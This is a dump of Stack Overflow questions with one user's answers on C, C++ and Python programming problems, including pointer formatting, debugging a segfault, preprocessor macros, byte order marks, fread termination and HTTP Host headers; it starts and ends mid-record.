","9530","","<p>As Mark Ransom noted in the comments, you can't use the <code>%d</code> format specifier to print a pointer, you must use <code>%p</code> in order for your code to be portable.  It's technically Undefined Behavior to use anything besides <code>%p</code> for pointers, but in all likelihood you'll see that it will seem to work ok on 32-bit systems.</p>

<p>However, on 64-bit systems, which I'd wager you're using, it blows up.  Pointers are 8 bytes, but <code>printf</code> only tries to read 4 bytes off of the stack when it sees <code>%d</code>.  For the second <code>%d</code> specifier, it reads the next 4 bytes, which are the other 4 bytes of the pointer—if you're seeing 0 for that, it probably means that your pointer was allocated within the first 4 GB of memory on a little-endian system (i.e. its value was something like <code>0x00000000'xxxxxxxx</code>).  The 8 bytes on the stack from the second pointer passed to <code>printf</code> never get read.</p>

<p>The <code>%p</code> specifier portably prints a pointer on all platforms, regardless of whether they're 32 bits, 64 bits, or some other size.  One unfortunate consequence of this is that the exact output format is <em>implementation-defined</em>, meaning it can and does change between systems.  Some systems might use a leading <code>0x</code> or <code>0X</code>, while others might have no prefix at all and just print the raw hex value.  Some might pad to the left with 0's, and others might not.</p>

<p>If you want to control the exact output, then you can use a format of your choice (e.g. <code>%08x</code> or <code>%016llx</code>) <em>as long as you cast the pointer appropriately for that specifier</em>.  For example, here's how you would do that on 32- and 64-bit systems:</p>

<pre><code>printf(""0x%08x\n"", (unsigned int)(uintptr_t)myPointer);           // 32-bit
printf(""0x%016llx\n"", (unsigned long long)(uintptr_t)myPointer);  // 64-bit
</code></pre>

<p>The reason for casting twice is to avoid spurious compiler warnings, since some compilers will complain if you cast from a pointer type to an integer type which isn't guaranteed to be large enough to hold a pointer.</p>
"
"<p>I met an problem here.<br/>
I could successfully create an dialog and add an button by code below,<br/>
because I know the constant ""128"" is the control ""button"" by exsiting example<br/>
but I do not know which one can be used for ""checkbox"" or ""radiobutton""?</p>

<hr>

<pre><code>import win32ui
import win32api
import win32con
from pywin.mfc import dialog

# Window frame and title
dlg = [ [title, (0, 0, 300, 392), style, None, (8, ""MS Sans Serif"")], ]
dlg.append([128, u""Output"", IDC_BTN_OUTPUT, (142,56,50,14), win32con.BS_DEFPUSHBUTTON])
</code></pre>

<hr>
","9530","","<p>According to the source code and the documentation, the dialog template here is a list whose first item is a <code>PyDLGTEMPLATE</code> instance followed by a series of <code>PyDLGITEMTEMPLATE</code> instances.</p>

<p>The documentation says this about the first member of the <code>PyDLGITEMTEMPALTE</code> structure:</p>

<blockquote>
  <p>[0] string/int : windowClass</p>
  
  <p>The window class. If not a string, it must be in integer defining one of the built-in Windows controls. If a string, it must be a pre-registered windows class name, a built-in class, or the CLSID of an OLE controls. Built-in classes include:</p>

<pre><code>Control Type    String Class Name
Check Box       Button
Combo Box       ComboBox
Command Button  Button
Header          SysHeader32
Label           Static
List Box        ListBox
                SysListView32
Option Button   Button
Tab             SysTabControl32
Text Box        Edit
                RICHEDIT
Tool Bar        ToolbarWindow32
Tool Tips       tooltips_class32
                tooltips_class
Tree View       SysTreeView32
</code></pre>
  
  <p>The built-in windows controls are:</p>

<pre><code>Integer Value    Window Type
0x0080           Button
0x0081           Edit
0x0082           Static
0x0083           List box
0x0084           Scroll bar
0x0085           Combo box
</code></pre>
</blockquote>

<p>So while you <em>could</em> use the integer constant 0x85 (or 133 decimal), I'd <strong>strongly</strong> recommend you use the string class name <code>'ComboBox'</code> instead.  These string names are, unsurprisingly, the same as the built-in Windows class names <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms633574%28v=vs.85%29.aspx#system"" rel=""nofollow"">documented on MSDN</a>.</p>
"
"<p>When i compile and run this selection sort of random char array i get a Segmentation fault (core dumped) error. I think it's got to do with accessing unallocated memory in my selection sort section. Can anyone help please?</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#define STRING_LEN 80
#define ARRAY_LEN 10000

void *emalloc(size_t s) {
   void *result = malloc(s);
   if (NULL == result) {
      fprintf(stderr, ""Memory allocation failed!\n"");
      exit(EXIT_FAILURE);
   }
   return result;
}

void selection_sort(char *words[], int n) {
   char *temp;
   int i, j;

   for (i = 0; i &lt; n; i++) {
      for (j = i+1; i &lt; n; j++) {
         if (strcmp(words[i], words[j]) &lt; 0) {
            temp = words[i];
            words[i] = words[j];
            words[j] = temp;
         }
      }
   }
}

int main(void) {
   char word[STRING_LEN];
   char *wordlist[ARRAY_LEN];
   int num_words;
   int i;

   num_words = 0;
   while (num_words &lt; ARRAY_LEN &amp;&amp; 1 == scanf(""%79s"", word)) {
      wordlist[num_words] = emalloc((strlen(word) + 1) * sizeof wordlist[0][0]);
      strcpy(wordlist[num_words], word);
      num_words++;
   }

   selection_sort(wordlist, num_words);

   for (i = 0; i &lt; num_words; i++) {
       printf(""%s\n"", wordlist[i]);
   }

   for (i = 0; i &lt; num_words; i++) {
      free(wordlist[i]);
   }

   return EXIT_SUCCESS;
}
</code></pre>
","9530","","<p>Instead of just pointing out your simple but hard-to-spot error, I'm going to walk you through how I debugged it so that you can learn how to use a debugger and solve these types of issues yourself (<em>teach a man to fish</em>, as the saying goes).</p>

<p>First, I compiled your code (with the warning level cranked up) and made sure I could reproduce the issue:</p>

<pre><code>$ clang test.c -o test -Wall -Wextra -pedantic  # No warnings, great!
$ echo -e 'foo\nbar\nbaz' | ./test
Segmentation fault: 11
</code></pre>

<p>Ok, it crashed.  The issue is reproducible.  Now, recompile with debug symbols (<code>-g</code>) and setup a test vector:</p>

<pre><code>$ clang test.c -o test -Wall -Wextra -pedantic -g
$ echo -e 'foo\nbar\nbaz' &gt; input
</code></pre>

<p>Now run the debugger and see what happens.  I'm using LLDB on Mac OS X, but the exact same commands would work in GDB:</p>

<pre><code>$ lldb ./test
Current executable set to './test' (x86_64).
(lldb) run &lt; input
Process 68367 launched: './test' (x86_64)
Process 68367 stopped
* thread #1: tid = 0x553a95, 0x00007fff918e0db5 libsystem_platform.dylib`_platform_strcmp + 181, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
    frame #0: 0x00007fff918e0db5 libsystem_platform.dylib`_platform_strcmp + 181
libsystem_platform.dylib`_platform_strcmp + 181:
-&gt; 0x7fff918e0db5:  movdqu (%rsi,%rcx), %xmm1
   0x7fff918e0dba:  pcmpeqb %xmm1, %xmm0
   0x7fff918e0dbe:  pcmpeqb %xmm2, %xmm1
   0x7fff918e0dc2:  pandn  %xmm0, %xmm1
</code></pre>

<p>We crashed inside the <code>strcmp()</code> function on a null pointer (the <code>address=0x0</code> part).  Now how did we get there and why did that happen?  Here's the stack trace:</p>

<pre><code>(lldb) bt
* thread #1: tid = 0x553a95, 0x00007fff918e0db5 libsystem_platform.dylib`_platform_strcmp + 181, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x0)
  * frame #0: 0x00007fff918e0db5 libsystem_platform.dylib`_platform_strcmp + 181
    frame #1: 0x0000000100000c96 test`selection_sort(words=0x00007fff5fbec1a0, n=3) + 86 at test.c:23
    frame #2: 0x0000000100000e03 test`main + 243 at test.c:45
</code></pre>

<p>Let's move up to where we called <code>strcmp()</code>:</p>

<pre><code>(lldb) up 1
frame #1: 0x0000000100000c96 test`selection_sort(words=0x00007fff5fbec1a0, n=3) + 86 at test.c:23
   20   
   21      for (i = 0; i &lt; n; i++) {
   22         for (j = i+1; i &lt; n; j++) {
-&gt; 23            if (strcmp(words[i], words[j]) &lt; 0) {
   24               temp = words[i];
   25               words[i] = words[j];
   26               words[j] = temp;
</code></pre>

<p>Now let's see what we were calling <code>strcmp()</code> with (<code>p</code> is shorthand for <code>print</code>):</p>

<pre><code>(lldb) p words[i]
(char *) $0 = 0x0000000100103920 ""foo""
(lldb) p words[j]
(char *) $1 = 0x0000000000000000
</code></pre>

<p>Welp, there's our null pointer.  How did that happen?  What are <code>i</code> and <code>j</code>?</p>

<pre><code>(lldb) p i
(int) $2 = 0
(lldb) p j
(int) $3 = 3
</code></pre>

<p>Oh no!  <code>j</code> is 3, but it shouldn't ever be 3 or more, since <code>n</code> is 3 (since we had 3 lines in the input file).  Shouldn't our loop prevent <code>j</code> from exceeding <code>n</code>...?  Take a closer look:</p>

<pre><code>22            for (j = i+1; i &lt; n; j++) {
</code></pre>

<p>Oops—there's the bug.  The loop test is <code>i &lt; n</code> when it should really be <code>j &lt; n</code>.  <code>j</code> grows without bound until it crashes or something else bad happens (like an attacker taking over your system if the input data were specially crafted to exploit this).</p>

<p>Here are some links to help learn how to use command line debuggers such as LLDB and GDB:</p>

<ul>
<li><a href=""http://lldb.llvm.org/tutorial.html"" rel=""nofollow"">LLDB Tutorial</a></li>
<li><a href=""http://www.dirac.org/linux/gdb/"" rel=""nofollow"">GDB Tutorial</a></li>
<li><a href=""http://www.yolinux.com/TUTORIALS/GDB-Commands.html"" rel=""nofollow"">GDB Cheat Sheet</a></li>
</ul>
"
"<p>I'm trying to get a simple Hello World! kernel to boot. Whenever I turn on my virtual machine I see GRUB load, select my OS, then get a random character on the screen, and crash with a triple fault. I believe the problem lies in my VGA section. I suspect that the issue lies somewhere with my use of C pointers. Neither C, nor pointers, are a strong suit. Specifically, I suspect the put_char() function to be involved. There were some compiler issues involving pointers. What am I doing wrong? How can I fix this?</p>

<p>Thanks for helping!</p>

<p>Here's the code for my VGA section:</p>

<pre><code>/*
    This file will handle dealing with VGA stuff so I can print to the screen.
*/

#include &lt;system.h&gt;

/* this pointer will be set to the VGA access memory address */
unsigned short *text_ptr;
int attrib = 0x0F; // foreground and background color gets set in here.
int csr_x = 0; // cursor x position
int csr_y = 0; // cursor y position
int screen_width = 80; // width of the screen in columns
int screen_height = 25; // height of the screen in rows

void vga_initialize()
{
    // set the text pointer to the proper location in memory
    text_ptr = (unsigned short *) 0x0B8000;
    clear_screen();
}

void set_text_color(unsigned char foreground_color, unsigned char background_color)
{
    attrib = (background_color &lt;&lt; 4) | (foreground_color &amp; 0x0F);
}

void put_str(char *text)
{
    // figure out the length of the string we'll be printing
    char *my_text = text;    // make a local copy of the pointer so the orinal's not overwritten.
    int str_length;
    for (str_length = 0; *my_text != '\0'; my_text++)    // set the string lenght to 0; if the character at the pointer isn't zero; increment the pointer
    {
        str_length++;    // increment the count
    }
    // for each character in the string
    for (int i = 0; i &lt; str_length; i++)
    {
        put_char(my_text[i]); // put the character on the screen
    }
}

void put_char(char c)
{
    unsigned short *index_ptr;
    unsigned int my_attrib = attrib &lt;&lt; 8;

    if (c == 0x08) // backspace
    {
        if (csr_x != 0)
        {
            csr_x--;
        }
    }
    else if (c == 0x09) // tab
    {
        csr_x = (csr_x + 8) &amp; ~(8 - 1); // increment x but only to a point that will make it divisible by 8 (i dunno, lawl)
    }
    else if (c == '\r') // carriage return, move cursor to beginning of row
    {
        csr_x = 0;
    }
    else if (c == '\n') // newline
    {
        csr_x = 0;
        csr_y++;
    }
    else if (c &gt;= ' ') // any character greater than or equal to space is a printable character
    {
        // figure out where to put the character
        index_ptr = text_ptr + (csr_y * screen_width + csr_x);
        // put the character and it's attribute into memory, which will put it on the screen when it refreshes.
        *index_ptr = c | my_attrib;
    }

    scroll();
    move_csr();
}



void scroll()
{
    unsigned short space_char = 0x20 | (attrib &lt;&lt; 8);
    // used to calculate the offsets needed when moving data around in the vga buffer memory
    int temp_offset;
    // screen's full, we need to scroll
    if (csr_y &gt;= screen_height)
    {
        // move everything up
        temp_offset = csr_y - screen_height + 1; // offset for calculating the addresses to use in the vga memory
        memcpy(text_ptr, text_ptr + temp_offset * screen_width, (screen_height - temp_offset) * screen_width * 2);
        // set the chunk of memory that occupies the last line of text to spaces
        memsetw(text_ptr + (screen_height - temp_offset) * screen_width, space_char, screen_width);
        // adjust the position of the cursor
        csr_y = screen_height - 1;
    }
}

void move_csr()
{
    unsigned char curr_pos = csr_y * screen_width + csr_x;
    outportb(0x3D4, 14);
    outportb(0x3D5, curr_pos &gt;&gt; 8);
    outportb(0x3D4, 15);
    outportb(0x3D5, curr_pos);
}

void clear_screen()
{
    unsigned short space_char;

    // i need to generate the ascii code? that represents a space of the proper background color
    space_char = 0x20 | (attrib &lt;&lt; 8);

    // write spaces to the entire screen
    for (int i = 0; i &lt; screen_height; i++)
    {
        for (int j = 0; j &lt; screen_width; j++)
        {
            memsetw(text_ptr + i * screen_width, space_char, 1);
        }
    }

    // reset the cursors x and y position
    csr_x = 0;
    csr_y = 0;
    move_csr(); // and reset the cursor in the hardware
}
</code></pre>

<p>I've been following along with various tutorials in an attempt to make my own operating system. So far I've been having a pretty good time with the GNU tool chain described <a href=""http://wiki.osdev.org/Bare_Bones"" rel=""nofollow"">here</a>. I'm using the GNU Assembler with the tool chain because I followed the directions, and didn't think about building NASM into it. I'd rather learn another flavor of Assembly than redo the tool chain. :-P I've been modeling my attempts on <a href=""http://www.osdever.net/bkerndev/Docs/title.htm"" rel=""nofollow"">Bran's Kernel Development tutorial.</a> I'm trying to keep the C code and GAS code in separate files because I don't like how the tutorials have all of the Assembly bunched into the boot loader. I'm making this on a Windows 7 machine, but using Debian for my coding. I have Oracle VirtualBox installed on Windows, and use it to emulate Debian. I then have Debian set up with my development tools, and use the text editor to code.</p>

<p>Below is a link to all of the code I'm using, VirtualBox logs of the crash, a log file of the commands I'm using in the Debian terminal to build my code, the object files, binary files, and iso files I've made.</p>

<p><a href=""http://wikisend.com/download/243118/POS_C3.zip"" rel=""nofollow"">http://wikisend.com/download/243118/POS_C3.zip</a></p>

<p>If you'd like to see the error yourself then you should be able to mount pos.iso onto a virtual machine, and run it. It should crash as advertised. At this time I've made code for the boot loader, kernel main function, GDT, and VGA stuff. I have the memory and I/O port functions in their own C files, and the GAS for the GDT is in its own file as well.</p>
","9530","","<p>Two issues I see:</p>

<p>1) Your <code>put_str()</code> function accesses invalid memory beyond the end of the <code>text</code> string, which is undefined behavior:</p>

<pre><code>void put_str(char *text)
{
    char *my_text = text; // (1)
    int str_length;
    for (str_length = 0; *my_text != '\0'; my_text++) // (2)
    {
        str_length++;    // increment the count
    }
    for (int i = 0; i &lt; str_length; i++)
    {
        put_char(my_text[i]); // (3)
    }
}
</code></pre>

<p>In this case, you assign <code>my_text</code> to the start of the string at (1) and then advance it to the end of the string at (2).  You then proceed to index into it from the end of the string at (3), which reads memory out of bounds.  You probably meant to write <code>text[i]</code> instead of <code>my_text[i]</code> at (3), or maybe you forgot to reset <code>my_text = text;</code> before that loop (either would produce equivalent results).  You could also replace the entire first loop with a call to <code>strlen()</code>, but instead of that there's a much simpler solution:</p>

<pre><code>void put_str(char *text)
{
    while (*text != 0)
    {
        put_char(*text);
        text++;
    }
}
</code></pre>

<p>This walks through the string looking for the NUL terminator and outputs each character as it goes.  No need to count the string length first and then reiterate through the string again.</p>

<p>2) This call to <code>memcpy()</code> inside the <code>scroll()</code> function has undefined behavior because the source and destination memory ranges can overlap:</p>

<pre><code>memcpy(text_ptr, text_ptr + temp_offset * screen_width, (screen_height - temp_offset) * screen_width * 2);
</code></pre>

<p>This likely wouldn't cause the triple fault exceptions you were seeing, but it can cause data to be copied incorrectly in strange ways, depending on how <code>memcpy()</code> is implemented in your standard library.  But since it's undefined behavior, you have to be prepared for anything, including demons flying out of your nose.</p>

<p>The simple and easy solution is to replace it with a call to <a href=""http://linux.die.net/man/3/memmove"" rel=""nofollow""><code>memmove()</code></a> instead, which has defined behavior even when the source and destination memory ranges overlap:</p>

<pre><code>memmove(text_ptr, text_ptr + temp_offset * screen_width, (screen_height - temp_offset) * screen_width * 2);
</code></pre>
"
"<p>I have the following code:</p>

<pre><code>#define UNIT_BASIC_UNIT_DEF2 (name) UNIT_BASIC_ ## name
#define UNIT_UNIT_TYPE_DEF2 (basic_type, name) UNIT_ ## basic_type ## _ ## name
#define UNIT_BASIC_UNIT_CLASS_NAME2(name) CUnit ## name
#define UNIT_UNIT_TYPE_CLASS_NAME2(basic_type, name) CUnit ## basic_type ## _ ## name

#define UNIT_BASIC_UNIT_DEF (name) UNIT_BASIC_UNIT_DEF2(name)
#define UNIT_UNIT_TYPE_DEF (basic_type, name) UNIT_UNIT_TYPE_DEF2 (basic_type, name)
#define UNIT_BASIC_UNIT_CLASS_NAME(name) UNIT_BASIC_UNIT_CLASS_NAME2(name)
#define UNIT_UNIT_TYPE_CLASS_NAME(basic_type, name) UNIT_UNIT_TYPE_CLASS_NAME2(basic_type, name)

#define UNIT_IMPLEMENT_UNIT_TYPE(basic_type, name) \
CUnitAbstract&amp; UNIT_UNIT_TYPE_CLASS_NAME(basic_type, name)::dup(){\
UNIT_UNIT_TYPE_CLASS_NAME(basic_type, name) * n = new UNIT_UNIT_TYPE_CLASS_NAME(basic_type, name)(this-&gt;value);\
return *n;\
}\
CUnitAbstract&amp; UNIT_UNIT_TYPE_CLASS_NAME(basic_type, name) ::operator+(CUnitAbstract&amp; value){\
DYNAMIC_ASSERT(dynamic_cast&lt; UNIT_BASIC_UNIT_CLASS_NAME(basic_type) *&gt;(&amp;value) != NULL);\
CUnitAbstract * tmp = &amp;this-&gt;dup();\
*tmp = this-&gt;value + conversionTable[UNIT_BASIC_UNIT_DEF(basic_type)][UNIT_UNIT_TYPE_DEF(basic_type, name)] * value.getInBasicUnit();return *tmp;\
}
</code></pre>

<p>When I'm calling the macro with</p>

<pre><code>UNIT_IMPLEMENT_UNIT_TYPE(DISTANCE, METER)
</code></pre>

<p>I get compilation errors:</p>

<pre><code>error: 'basic_type' was not declared in this scope
error: 'name' was not declared in this scope
error: expected ']' before 'UNIT_basic_type_name'
error: expected ';' before 'UNIT_basic_type_name'
</code></pre>

<p>meaning that the macro wasn't expanded as I wanted it to in the last line inside the brackets.
What did I do wrong?</p>
","9530","","<pre><code>#define UNIT_BASIC_UNIT_DEF2 (name) UNIT_BASIC_ ## name
#define UNIT_UNIT_TYPE_DEF2 (basic_type, name) UNIT_ ## basic_type ## _ ## name
...
#define UNIT_BASIC_UNIT_DEF (name) UNIT_BASIC_UNIT_DEF2(name)
#define UNIT_UNIT_TYPE_DEF (basic_type, name) UNIT_UNIT_TYPE_DEF2 (basic_type, name)
</code></pre>

<p>Remove the spaces between the macro name and the argument list.  These should be:</p>

<pre><code>#define UNIT_BASIC_UNIT_DEF2(name) ...
//                         ^^^
//                     no space here!
</code></pre>

<p>When there's a space like this:</p>

<pre><code>#define FOO (params) replacement
</code></pre>

<p>that defines an <em>object-like macro</em>, where the symbol gets directly replaced by the replacement list, with no parameter substitution.  So an invocation like this:</p>

<pre><code>FOO(bar)
</code></pre>

<p>gets expanded to this:</p>

<pre><code>(params) replacement
</code></pre>

<p>By removing the space, you get a <em>function-like macro</em> as intended:</p>

<pre><code>#define FOO(params) replacement
</code></pre>

<p>and <code>FOO(bar)</code> gets correctly expanded to <code>replacement</code>.</p>
"
"<p>I have here a function <code>get_stack</code> that instantiates a stack and should return a pointer to the stack, but doesn't. Still, the program continues and updates the stack correctly.</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;    
#define STACKLIM 1000


struct stack {
    char data[STACKLIM];
    int top;
};

typedef struct stack* Stack;

Stack get_stack() {
    Stack s = (Stack)(malloc(sizeof(struct stack)));
    s-&gt;top = -1;
    //return s;
}

void push(Stack s, char val) {
    if(s-&gt;top == STACKLIM) {
        printf(""ERROR: Stack Overflow\n"");
    }
    else {
        s-&gt;top += 1;
        s-&gt;data[s-&gt;top] = val;
    }
}

void display(Stack s) {
    int i;
    printf(""Stack -&gt; "");
    for(i = 0; i &lt;= s-&gt;top; i++) {
        printf(""%c "", s-&gt;data[i]);
    }
    printf(""\n"");
}

int main() {
    Stack d = NULL;
    d = get_stack();
    push(d, 'a');
    display(d);        
    return 0;
}
</code></pre>

<p>It's like the return statement does not matter. What could be the reason for this? I am using gcc 4.5.2 on an RH5 machine.</p>
","9530","","<p>Whether or not the compiler diagnoses it, it's always an error to fall off the end of a function (i.e. reach the closing <code>}</code>) without returning a value if the function has a non-<code>void</code> return type.  It's <strong>Undefined Behavior</strong>.</p>

<p>Now, Undefined Behavior can manifest itself in many different ways.  It can result in your program crashing, receiving the wrong value, erasing your hard drive, sending a nasty email to your mother, or <em>appearing to work successfully with no other ill effects</em>.  All of these behaviors are permitted by the C language standard.  Just because the code may appear to work correctly, that doesn't mean it's actually correct and working.</p>

<p>If you crash when you invoke Undefined Behavior, you should consider yourself lucky, since those are usually easy to diagnose.  But if your program silently corrupts memory and then later crashes in an ""impossible"" situation, you're going to be in for one heck of a difficult debugging job.</p>

<p>Moral of the story: compile your code with a high warning level (e.g. use the <code>-Wall</code> compiler option; possibly also <code>-Wextra</code> and/or <code>-pedantic</code> if you can bear it; <code>-Werror</code> also strongly recommended).  Any compiler worth its salt will catch this kind of error, <em>but often times not at the default warning level</em>.</p>
"
"<p>I am receiving 3 bad characters at the beginning of my first word out of a file, using ifstream.
I have tried trimming the string, but to no avail.<br /></p>

<pre><code>string trim(string in){
    string out;
    int strBegin = in.find_first_not_of("" \t"");
    if( strBegin == string::npos)
        return """";//nothing

    int strEnd = in.find_last_not_of("" \t"");
    int strRange = strEnd - strBegin + 1;

    out = in.substr(strBegin, strRange);
    transform(out.begin(), out.end(), out.begin(), ::tolower);

    return out;
}
</code></pre>

<p>And here is the output i am getting when reading ""Hello,"" the first word in my file.<br /></p>

<pre><code>� i: 0
�� i: 1
�he i: 2
hell i: 3
ello i: 4
llo i: 5
lo i: 6
o i: 7
</code></pre>

<p>And this is printed from:</p>

<pre><code>for(int i=0; i&lt;temp.length(); i++){
    cout&lt;&lt;temp.substr(i,i+1)&lt;&lt;"" i: ""&lt;&lt;i&lt;&lt;endl;
}
</code></pre>

<p><br />
cat -vg on txt file<br /></p>

<pre><code>M-oM-;M-?Hello, world test
</code></pre>

<p>file actually contains ""Hello, World test"" as first line</p>
","9530","","<p>You have a UTF-8 <a href=""https://en.wikipedia.org/wiki/Byte_order_mark"" rel=""nofollow"">byte order mark</a> at the beginning of your document consisting of the 3-byte sequence <code>EF BB BF</code> in hex (which is equivalent to <code>M-oM-;M-?</code>, in the language of <code>cat -vt</code>).</p>

<p>You need to either modify your program to deal with the BOM appropriately (i.e. ignore it) or re-encode your text file to remove the BOM.  Many text editing programs will not display the BOM in your document, so you may <em>think</em> it's not there, but it's there nonetheless.</p>
"
"<p>I have a 50gb file that I want to read.</p>

<p>There will be x instructions to read from the 50gb file. They will be in sequential order but the locations are unpredictable. Each instruction will read 1 byte. </p>

<p>The total reads account for &lt; 0.0000001% of the total file size, probably around 100 bytes total.</p>

<p>Right now I am using seekg with offsets to do this but it is taking > 3 seconds sometimes.</p>

<p>Would memory mapping the file speed up the read in this case? Does it even make sense to memory map the file if I don't have 50gb of ram?</p>

<p>Is there something else I can do to speed this up?</p>

<p>Here is some code that takes around 2 seconds to run for me ( I adjusted it to make 300 reads to make it take longer):</p>

<pre><code>#include &lt;iostream&gt;
#include &lt;fstream&gt;
#include &lt;set&gt;
#include &lt;cstdlib&gt;

using namespace std;

int main() {

    ifstream in(""E:/t.dat"", ifstream::binary);
    in.rdbuf()-&gt;pubsetbuf(0, 1);
    set&lt;long long&gt; S;
    srand(time(NULL));
    for(int i=0;i&lt;300;i++){
        S.insert((long long)(rand()%50000000)*1000ll);

    }

    long long offset = 0;
    in.seekg(0,ios::beg);
    int sum = 0;
    for(set&lt;long long&gt;::iterator it = S.begin(); it!=S.end(); it++){
        long long toseek = *it - offset;
        while(toseek &gt; 2000000000){
            in.seekg(2000000000,ios::cur);
            toseek -= 2000000000;
            offset += 2000000000;
        }
        in.seekg(toseek,ios::cur);
        offset += toseek;
        char c;
        in.read(&amp;c,1);
        offset++;
        sum += (int)c;
    }
    cout&lt;&lt;sum&lt;&lt;endl;
}
</code></pre>
","9530","","<blockquote>
  <p>Would memory mapping the file speed up the read in this case?</p>
</blockquote>

<p>That's hard to answer without knowing more details about the file access patterns and the OS.  Your best bet would be to try it out and measure.  But for the non-memory mapping case, I'd recommend disabling buffering <a href=""http://linux.die.net/man/3/setvbuf"" rel=""nofollow""><code>setvbuf(3)</code></a> on the file to avoid reading in any extra data (or alternatively, using the raw Unix file API of <a href=""http://linux.die.net/man/2/open"" rel=""nofollow""><code>open(2)</code></a>/<a href=""http://linux.die.net/man/2/lseek"" rel=""nofollow""><code>lseek(2)</code></a>/<a href=""http://linux.die.net/man/2/read"" rel=""nofollow""><code>read(2)</code></a>/<a href=""http://linux.die.net/man/2/close"" rel=""nofollow""><code>close(2)</code></a>).  You can also use <a href=""http://linux.die.net/man/2/posix_fadvise"" rel=""nofollow""><code>posix_fadvise(2)</code></a> to give hints to the OS about how to buffer the file pages -- in your case, you probably want to pass <code>POSIX_FADV_RANDOM</code> to tell it that you'll be accessing the file pages randomly, which <em>might</em> disable readahead behavior which would do unnecessary I/O.</p>

<blockquote>
  <p>Does it even make sense to memory map the file if I don't have 50gb of ram?</p>
</blockquote>

<p>Sure it does, as long as you have enough address space -- this won't work at all for a 32-bit process, but it will be fine in a 64-bit process.  The OS will allocate the virtual address space for the entire range of the file, but thanks to demand paging, it won't commit any physical memory to it until you actually read or write any given page.  If you happen to touch more pages than can fit in physical memory at once, then the pager will just page out the least recently used pages.</p>
"
"<h1>The Scoop:</h1>

<p>I am creating a method that runs through a lengthy file in chunks: using <code>pthreads</code>. I am calling <code>fread()</code> to read the file in this sort of fashion:</p>

<pre><code>fread( thread_data[i].buffer, 1, 50, f )
/*
 thread_data is a data structure for each thread (hence i)
 buffer is in thread_data as an array of length 50
 */
</code></pre>

<p>I am then directly calling a print statement to see what each thread is doing, as a weird pattern was showing up in some of the parts that I was printing. <strong>Namely, my print statement would look something like this</strong>:</p>

<pre><code> this is suppose to be 50 characters, but it is only a fewgD4
</code></pre>

<p><strong>That <code>D4</code> directly above</strong> is what I have my question on. Every thread that I make, at the end of the string, we are printing <code>D4</code>, and in this case, followed by a <code>g</code>. Other times, it is followed by a d, and most commonly a �. Now, <a href=""http://en.wikipedia.org/wiki/Specials_%28Unicode_block%29"" rel=""nofollow"">I did read the wikipedia page</a> on this character, which states:</p>

<blockquote>
  <p>replacement character used to replace an unknown or unrepresentable character</p>
</blockquote>

<h1>My question:</h1>

<p>What kind of an error am I running into? Why is the end of each read statement containing unknown characters, especially the weird <code>gD4</code> guy?</p>

<h1>Aside:</h1>

<p>I am trying to make a function in <a href=""/questions/tagged/c"" class=""post-tag"" title=""show questions tagged &#39;c&#39;"" rel=""tag"">c</a> that utilizes pthreads to find the frequency of each word in a file, in case anyone was wondering. These weird characters were showing up in my list,  which is something that I find slightly unpleasent. Finally, <a href=""http://kunststube.net/encoding/"" rel=""nofollow"">don't bother linking me to the Obligaroty Unicode article</a>, I am already aware of it, and the characters are not outside of what I am working with.</p>
","9530","","<p>The strings you are printing out are not null-terminated — <code>fread()</code> does not null-terminate its output, it simply reads in as many raw bytes as you asked for (or fewer).  So when you print out your buffer, your print function is walking past the end of the data and printing out whatever garbage memory comes after the buffer, which in your case just happens to be <code>gD4</code>.</p>

<p>You need to either explicitly null-terminate your buffer; or, if your print function supports it, tell it exactly how many characters to print.  Either way, you need to save the return value from <code>fread</code> to know how many characters you read.  For example:</p>

<pre><code>int n = fread(thread_data[i].buffer, 1, 50, f);
if (n &lt; 0) /* Handle error */ ;

// Explicitly add a null terminator -- make sure the buffer has room for it!
thread_data[i].buffer[n] = 0;
</code></pre>
"
"<p>I have a code where I want to request a text file on the website using python(2.7.6) socket.</p>

<pre><code>import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
h='58.68.237.xxx'
p=80
s.connect((h,p))
m='GET / HTTP/1.1\r\n\r\n'
s.sendall(m)
r=s.recv(4096)
print r
</code></pre>

<p>And, I got the output:</p>

<pre><code>HTTP/1.1 400 Bad Request\r\n
Date: Mon, 13 Oct 2014 02:46:15 GMT\r\n
Server: Apache/2.2.3 (CentOS)\r\n
Content-Length: 300\r\nConnection: close\r\n
Content-Type: text/html; charset=iso-8859-1\r\n
\r\n
&lt;!DOCTYPE HTML PUBLIC ""-//IETF//DTD HTML 2.0 //EN""&gt;\n
&lt;html&gt;&lt;head&gt;\n
&lt;title&gt;400 Bad Request&lt;/title&gt;\n
&lt;/head&gt;&lt;body&gt;\n
&lt;h1&gt;Bad Request&lt;/h1&gt;\n
&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br/&gt;\n
&lt;/p&gt;\n&lt;hr&gt;\n
&lt;address&gt;Apache/2.2.3 (CentOS) Server at 127.0.0.1 Port 80&lt;/address&gt;\n
&lt;/body&gt;&lt;/html&gt;\n
</code></pre>

<p><em>Question:</em>
What is wrong with my code? 
How can I fix it for a good request?</p>
","9530","","<p>HTTP 1.1 requires that you transmit a <code>Host</code> header with all requests. From <a href=""http://tools.ietf.org/html/rfc2616#section-14.23"" rel=""nofollow"">RFC 1626 section 14.23</a>:</p>

<blockquote>
  <p>A client MUST include a Host header field in all HTTP/1.1 request
     messages . [...] All
     Internet-based HTTP/1.1 servers MUST respond with a 400 (Bad Request)
     status code to any HTTP/1.1 request message which lacks a Host header
     field.</p>
</blockquote>

<p>The reason for the <code>Host</code> header is to allow the server to disambiguate which website is being accessed, if multiple websites are being served up on the same IP address.</p>

<p>Alternatively, you can use HTTP 1.0 instead of HTTP 1.1.  HTTP 1.0 doesn't require the <code>Host</code> header, so it may work if the server you're connecting to only has a single website on it, but if it's hosting multiple websites, you'll probably still get a 400 error.</p>
"
"<p>On a <strong>32-bit Ubuntu</strong> machine, from <strong>JDK 1.7.0</strong>, I'm unable to print wide characters.</p>

<p>Here is my code:</p>

<h3>JNIFoo.java</h3>

<pre><code>public class JNIFoo {    
    public native void nativeFoo();    

    static {
        System.loadLibrary(""foo"");
    }        

    public void print () {
        nativeFoo();
        System.out.println(""The end"");
    }

    public static void main(String[] args) {
        (new JNIFoo()).print();
        return;
    }
}
